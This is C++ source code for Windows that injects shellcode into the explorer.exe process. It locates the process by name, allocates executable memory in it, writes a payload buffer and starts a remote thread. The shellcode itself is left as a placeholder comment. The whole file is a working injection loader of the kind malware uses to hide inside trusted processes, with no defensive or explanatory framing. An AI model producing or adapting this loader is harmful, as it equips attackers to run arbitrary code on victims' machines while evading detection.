#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <cstring>

unsigned char buf[] = /*Shellcode*/;
unsigned int payload_len = sizeof(buf);

int GetExplorerPID() {
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, "explorer.exe") == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } 
        while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int steal_process() {
    
    DWORD PID, new_pid = 0;
    HANDLE hProcess, hThread;
    void* rBuffer;

    PID = GetExplorerPID();
    if (PID == 0) {
        std::cerr << "[X] Could not find Explorer's PID\n";
        return 1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        std::cerr << "[X] Could not open process [" << PID << "]\n";
        return 1;
    }

    rBuffer = VirtualAllocEx(hProcess, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, rBuffer, buf, payload_len, NULL);

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &new_pid);

    if (hThread == NULL) {
        CloseHandle(hProcess);
        std::cerr << "[X] Failed to create remote thread\n";
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

int main() {
    steal_process();
    return 0;
}
